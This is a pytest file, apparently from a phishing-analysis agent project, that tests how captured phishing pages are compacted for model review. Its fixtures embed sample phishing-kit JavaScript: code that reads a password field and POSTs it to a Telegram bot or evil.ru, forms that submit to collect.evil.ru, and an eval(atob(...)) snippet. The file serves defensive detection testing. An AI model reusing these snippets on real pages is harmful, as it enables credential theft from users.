# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
import json

import pytest
from agent_fakes import FakeS3
from test_code_analyst import make_open_page, page_with_dom

from phish_agents.code_analyst import compact_view
from phish_agents.code_analyst.capture import CodeCapture
from phish_agents.code_analyst.compact_view import compact_capture, compact_dom, library_name
from phish_agents.common.timing import CallRecorder

pytestmark = pytest.mark.usefixtures("public_dns")

JQUERY = (
    "/*! jQuery v3.7.1 | (c) OpenJS Foundation */" + "!function(e){var t=XMLHttpRequest;}" * 3000
)
KIT = (
    "var a=1;" * 2000
    + "fetch('https://api.telegram.org/bot123456789:AAE/sendMessage?chat_id=9',"
    + "{method:'POST',body:JSON.stringify({p:document.getElementById('password').value})});"
    + "var b=2;" * 2000
)


def capture(**extra) -> dict:
    return {
        "final_url": "https://paypal-verify.xyz/login",
        "status": 200,
        "title": "Log in",
        "redirect_chain": [{"url": "https://paypal-verify.xyz/login", "via": "start"}],
        "forms": [
            {"action": "https://collect.evil.ru/p.php", "method": "post", "inputs": ["password"]}
        ],
        "dom_html": "<html><head><style>"
        + "a{b:c}" * 2000
        + "</style></head><body>"
        + "<svg>"
        + "<path d='M0'/>" * 500
        + "</svg><!-- c -->"
        + "<form action='https://collect.evil.ru/p.php'><input type='password'></form>"
        + "<p>"
        + "lorem ipsum " * 200
        + "</p></body></html>",
        "iframes": ["https://evil.ru/frame"],
        "meta_refresh": None,
        "scripts": [
            {"src": "https://code.jquery.com/jquery-3.7.1.min.js", "text": JQUERY, "in_dom": True},
            {"src": "https://paypal-verify.xyz/app.js", "text": KIT, "in_dom": True},
            {"src": None, "text": "eval(atob('ZG9jdW1lbnQ='))"},
            {"src": "chrome-extension://x/rrweb.min.js", "text": "", "in_dom": True},
        ],
        "requests": [
            {
                "url": f"https://img.cdn.com/{i}.png",
                "method": "GET",
                "resource_type": "image",
                "has_body": False,
            }
            for i in range(120)
        ]
        + [
            {
                "url": "https://collect.evil.ru/p.php",
                "method": "POST",
                "resource_type": "xhr",
                "has_body": True,
            }
        ],
        "listeners": [{"type": "keydown", "target": "input[password]", "via": "listener"}],
        "sinks": [{"kind": "fetch", "url": "https://api.telegram.org/bot1/sendMessage"}],
        "derived_signals": [
            {"name": "credential_form_off_domain", "severity": "high", "detail": "x"}
        ],
        **extra,
    }


def test_facts_are_kept_verbatim_and_bulk_is_summarised():
    data = capture(blocked_by_site=None)
    view = compact_capture(data, 8_000)
    for key in (
        "forms",
        "iframes",
        "listeners",
        "sinks",
        "derived_signals",
        "redirect_chain",
        "title",
    ):
        assert view[key] == data[key]
    assert "requests" not in view
    assert view["network"]["total_requests"] == 121
    assert view["network"]["notable_requests"] == [data["requests"][-1]]
    hosts = {h["host"]: h for h in view["network"]["hosts"]}
    assert hosts["img.cdn.com"]["counts"] == {"image": 120}
    assert view["network"]["hosts"][0]["host"] == "collect.evil.ru"
    assert len(json.dumps(view)) < len(json.dumps(data)) / 3


def test_kit_code_survives_and_libraries_and_extensions_do_not():
    view = compact_capture(capture(), 8_000)
    by_src = {s["src"]: s for s in view["scripts"]}
    assert "chrome-extension://x/rrweb.min.js" not in by_src
    assert view["capture_browser_extension_scripts"] == 1
    jquery = by_src["https://code.jquery.com/jquery-3.7.1.min.js"]
    assert jquery["library"] == "jquery" and "text" not in jquery and "excerpt" not in jquery
    kit = by_src["https://paypal-verify.xyz/app.js"]
    assert "telegram_exfil" in kit["markers"] and "api.telegram.org/bot123456789" in kit["excerpt"]
    assert len(kit["excerpt"]) <= compact_view.SCRIPT_EXCERPT_LIMIT
    assert by_src[None]["text"] == "eval(atob('ZG9jdW1lbnQ='))"


def test_budget_bounds_the_view():
    data = capture()
    data["scripts"] += [{"src": None, "text": "document.write(x);" + "y" * 5000} for _ in range(40)]
    sizes = {
        t: len(json.dumps(compact_capture(data, t), separators=(",", ":"))) for t in (4_000, 8_000)
    }
    assert sizes[4_000] < sizes[8_000] <= 8_000 * compact_view.CHARS_PER_TOKEN * 1.1
    assert any(s.get("text_omitted") for s in compact_capture(data, 4_000)["scripts"])


def test_library_needs_a_vendor_host_or_a_curated_cdn_file():
    assert library_name("https://www.googletagmanager.com/gtm.js?id=G", "") == "gtm"
    assert library_name("https://googletagmanager.com.evil.ru/gtm.js", "") is None
    assert library_name("https://evil.ru/jquery.min.js", JQUERY) is None
    assert library_name(None, JQUERY) is None
    assert (
        library_name("https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js", "")
        == "jquery"
    )
    assert library_name("https://cdnjs.cloudflare.com/ajax/libs/x/kit-jquery.js", "") is None
    assert library_name("https://cdn.jsdelivr.net/gh/evil/kit/jquery-x.js", "") is None
    assert library_name("https://www.google.com/recaptcha/api.js", "") == "captcha"
    assert library_name("http://[::1/x", "") is None


def test_a_spoofed_library_banner_still_shows_its_code():
    spoof = (
        "/*! jQuery v3.6.0 */"
        + "var q=1;" * 600
        + (
            "document.querySelector('input[type=password]').value;"
            "fetch('https://evil.ru/c',{method:'POST'});location.href='https://evil.ru/';"
        )
    )
    data = capture(scripts=[{"src": "https://paypal-verify.xyz/jquery.min.js", "text": spoof}])
    script = compact_capture(data, 8_000)["scripts"][0]
    assert "library" not in script and script["library_banner"] == "jquery"
    assert {"credentials", "network_send", "redirect"} <= set(script["markers"])
    assert "https://evil.ru/c" in script["urls"]
    assert "fetch('https://evil.ru/c'" in (script.get("text") or script.get("excerpt"))


def test_dom_drops_style_svg_comments_and_long_text_but_keeps_forms():
    dom = compact_dom(capture()["dom_html"])
    assert "a{b:c}" not in dom and "<path" not in dom and "<!--" not in dom
    assert "<form action='https://collect.evil.ru/p.php'><input type='password'></form>" in dom
    assert len(dom) < 600


async def test_model_view_uses_compact_view_only_when_enabled(monkeypatch):
    cap = CodeCapture(
        "https://paypal-verify.xyz",
        "scan-12345678",
        CallRecorder(),
        FakeS3(),
        "b",
        make_open_page(page_with_dom(), []),
    )
    await cap.capture()
    monkeypatch.delenv(compact_view.MODE_ENV, raising=False)
    full = cap.model_view(sanitize=False)
    assert full.startswith("<<<UNTRUSTED_PAGE_CONTENT>>>") and '"requests"' in full
    monkeypatch.setenv(compact_view.MODE_ENV, "compact")
    monkeypatch.setenv(compact_view.TOKENS_ENV, "8000")
    view = cap.model_view(sanitize=False)
    assert view.startswith(compact_view.NOTE)
    assert '"network"' in view and '"requests"' not in view and "telegram" in view
    retry = cap.model_view(sanitize=True)
    assert not retry.startswith(compact_view.NOTE) and '"requests"' in retry
    assert "collect.evil.ru/p.php" in retry


def test_budget_env_parsing(monkeypatch):
    monkeypatch.setenv(compact_view.TOKENS_ENV, "junk")
    assert compact_view.budget_tokens() == compact_view.DEFAULT_TOKENS
    monkeypatch.setenv(compact_view.TOKENS_ENV, "10")
    assert compact_view.budget_tokens() == compact_view.MIN_TOKENS


UBII = (
    "const ENLACE_DESTINO = 'https://pay-redirect.example/';"
    + "function tick(){var n=0;}" * 120
    + "btn.onclick=function(){setTimeout(function(){window.location.href=ENLACE_DESTINO;},1000)};"
)


def test_script_urls_and_whole_scripts_keep_a_far_redirect_target():
    data = capture(scripts=[{"src": None, "text": UBII, "in_dom": True}])
    view = compact_capture(data, 8000)
    entry = view["scripts"][0]
    assert entry["urls"] == ["https://pay-redirect.example/"]
    assert entry["text"] == UBII


def test_libraries_get_no_url_list_and_long_scripts_fall_back_to_excerpts():
    big = "var pad=0;" * 4000 + "location.href='https://next.evil.ru/x';" + "var pad=1;" * 4000
    data = capture(
        scripts=[
            {"src": "https://code.jquery.com/jquery-3.7.1.min.js", "text": JQUERY, "in_dom": True},
            {"src": "https://paypal-verify.xyz/big.js", "text": big, "in_dom": True},
        ]
    )
    view = compact_capture(data, 8000)
    lib, kit = view["scripts"]
    assert "urls" not in lib and "text" not in lib
    assert kit["urls"] == ["https://next.evil.ru/x"]
    assert "text" not in kit and "next.evil.ru" in kit["excerpt"]
    assert len(json.dumps(view)) <= 8000 * compact_view.CHARS_PER_TOKEN * 1.1


def test_a_window_bridging_two_spans_merges_into_one_without_duplicates():
    text = "".join(f"{i:04d}" for i in range(2000))
    hits = [(1000, 1004, "a", 5), (1600, 1604, "b", 4), (1360, 1364, "c", 3)]
    excerpt = compact_view._windows(text, hits, 10_000)
    assert " … " not in excerpt
    assert excerpt == text[1000 - compact_view.WINDOW_BEFORE : 1604 + compact_view.WINDOW_AFTER]


def test_the_heaviest_hit_is_never_pushed_out_by_lighter_ones():
    text = "".join(f"var password{i}=1;" + "x" * 400 for i in range(6)) + "y" * 3000
    text += "fetch('https://api.telegram.org/bot123456:AAA/sendMessage?chat_id=1')"
    hits = compact_view._hits(text, False)
    excerpt = compact_view._windows(text, hits, 600)
    assert "api.telegram.org/bot123456" in excerpt
    assert len(excerpt) <= 600


@pytest.mark.parametrize(
    "bad",
    [
        {"scripts": [None, {"src": 5, "text": 123}]},
        {"requests": [None, {"url": 7}, {"url": "http://[::1/x", "method": "POST"}]},
        {"dom_html": 42, "final_url": "http://[::1/x"},
        {"scripts": "nope", "requests": {"a": 1}},
    ],
)
def test_odd_capture_shapes_do_not_raise(bad):
    view = compact_capture(capture(**bad), 8_000)
    json.dumps(view)
    assert view["forms"] == capture()["forms"]


def test_notable_requests_keep_distinct_queries_and_third_party_beacons():
    reqs = [
        {
            "url": f"https://api.telegram.org/bot1/sendMessage?text=pw{i}",
            "method": "GET",
            "resource_type": "fetch",
        }
        for i in range(3)
    ] + [
        {
            "url": "https://evil.ru/p.gif?pw=hunter2&user=bob@example.com",
            "method": "GET",
            "resource_type": "image",
        },
        {
            "url": "https://www.google-analytics.com/g/collect?v=2&tid=G-123456789",
            "method": "GET",
            "resource_type": "image",
        },
        {
            "url": "https://paypal-verify.xyz/logo.png?v=1234567890123456789012",
            "method": "GET",
            "resource_type": "image",
        },
    ]
    urls = [
        r["url"]
        for r in compact_capture(capture(requests=reqs), 8_000)["network"]["notable_requests"]
    ]
    assert sum("sendMessage" in u for u in urls) == 3
    assert "https://evil.ru/p.gif?pw=hunter2&user=bob@example.com" in urls
    assert not any("google-analytics" in u or "logo.png" in u for u in urls)


def test_dom_keeps_styles_that_hide_content():
    dom = compact_dom(
        "<div style='display:none'><input name=a></div><p style='color:red'>x</p>"
        "<div style=\"opacity:0.5\">y</div><div style='opacity: 0'>z</div>"
    )
    assert "display:none" in dom and "opacity: 0" in dom
    assert "color:red" not in dom and "opacity:0.5" not in dom


def test_dom_drops_script_bodies_whatever_the_end_tag_looks_like():
    dom = compact_dom(
        "<p>a</p><SCRIPT>one()</SCRIPT ><script>two()</script foo>"
        "<script>three()</script\t\n bar><style>x{}</style class=y><script>four()"
    )
    assert dom.startswith("<p>a</p>")
    assert not any(body in dom for body in ("one()", "two()", "three()", "four()", "x{}"))


def test_budget_is_capped_inside_the_untrusted_fence(monkeypatch):
    monkeypatch.setenv(compact_view.TOKENS_ENV, "100000")
    assert compact_view.budget_tokens() == compact_view.MAX_TOKENS
